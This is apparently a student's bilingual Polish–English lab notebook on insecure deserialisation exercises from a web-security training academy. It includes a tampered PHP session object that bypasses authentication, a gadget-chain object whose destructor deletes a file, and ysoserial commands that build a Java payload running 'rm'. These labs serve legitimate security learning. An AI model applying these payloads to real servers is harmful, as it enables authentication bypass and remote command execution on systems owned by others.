Insecure Deserialisation = problem z KONWERSJĄ danych
Prototype Pollution      = problem z STRUKTURĄ obiektów JS

 
Dane w RAM = specyficzne dla procesu, maszyny, języka Dane w sieci = muszą być uniwersalne i przenośne Konwersja = tłumacz między tymi dwoma światami
Bez konwersji każda aplikacja mówiłaby własnym, niezrozumiałym dla innych językiem.

 marshalling (Ruby) or pickling (Python). These terms are synonymous with "serialization" in this context.

 
Aplikacja = kod działający na serwerze – to on deserializuje dane i jest podatny.
Przeglądarka tylko wysyła – serwer przetwarza. Problem leży zawsze po stronie serwera.

<br><br>
<hr>
<br><br>
<h2>Lab: Modifying serialized objects</h2>

Login > intercept > Cookies > burp inspector > b0 na b1 > forward
znów to samo, tylko /admin/delete?username=carlos

<br><br>
<hr>
<br><br>
<h2>Lab: Modifying serialized data types</h2>

<br>

To access another user's account, you will need to exploit a quirk in how PHP compares data of different types.

Note that PHP's comparison behavior differs between versions. This lab assumes behavior consistent with PHP 7.x and earlier.

<br>
Login > intercept > Cookies > burp inspector

O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
/admin/delete?username=carlos

<br><br>
<hr>
<br><br>
<h2>Lab: Using application functionality to exploit insecure deserialization</h2>


<img width="1336" height="447" alt="image" src="https://github.com/user-attachments/assets/3a878e0b-a149-4bbc-8265-8dda2752e33c" />

<br><br>
<hr>
<br><br>
<h2>Lab: Arbitrary object injection in PHP</h2>

You can sometimes read source code by appending a tilde (~) to a filename to retrieve an editor-generated backup file. 
<br>
Serwer deserializuje dane bez weryfikacji. Klasa CustomTemplate już istnieje w kodzie — nie musisz jej wstrzykiwać. Wystarczy kontrolować atrybuty obiektu, żeby zmusić istniejący kod (gadżet) do zrobienia czegoś złośliwego.
<br>
1. Log in to your own account and notice the session cookie contains a serialized PHP object.
2.  In Burp Repeater, notice that you can read the source code by appending a tilde (~) to the filename in the request line.
3.  In the source code, notice the CustomTemplate class contains the __destruct() magic method. This will invoke the unlink() method on the lock_file_path attribute, which will delete the file on this path.
4.  Plan ataku: Stwórz zserializowany obiekt CustomTemplate, gdzie lock_file_path = /home/carlos/morale.txt. Gdy serwer go deserializuje, destruktor automatycznie usunie ten plik.


Na start, automat
<img width="1131" height="418" alt="image" src="https://github.com/user-attachments/assets/fc5c40ec-6556-4605-ae0f-5acdec067d26" />
<br>
<img width="1192" height="381" alt="image" src="https://github.com/user-attachments/assets/b5924de5-3e0f-4c92-8ba7-f3aa15cb5c0c" />
<br>
<img width="1290" height="656" alt="image" src="https://github.com/user-attachments/assets/ca64b225-efda-4f3d-b097-3758378f9738" />
<br>
<img width="980" height="317" alt="image" src="https://github.com/user-attachments/assets/7827133a-fd68-41e5-9085-0d3abb9b7aba" />

<br><br>
<hr>
<br><br>
<h2>Lab: Exploiting Java deserialization with Apache Commons</h2>
YSOSERIAL TOOL

1. Potwierdzenie podatności! rO0AB = zserializowany obiekt Java. ✅
Co widać w ciasteczku - login
Zdekodujmy. Widać tam lab.actions.common.serializable.AccessTokenUser — klasa użytkownika.

2. payload

    In Java versions 16 and above:
    java -jar ysoserial-all.jar \
       --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
       --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
       --add-opens=java.base/java.net=ALL-UNNAMED \
       --add-opens=java.base/java.util=ALL-UNNAMED \
       CommonsCollections4 'rm /home/carlos/morale.txt' | base64

    In Java versions 15 and below:
    java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64

3. In Burp Repeater, replace your session cookie with the malicious one you just created. Select the entire cookie and then URL-encode it.
Send the request to solve the lab.


<br><br>
<hr>
<br><br>
<h2>Lab: Exploiting PHP deserialization with a pre-built gadget chain</h2>






 
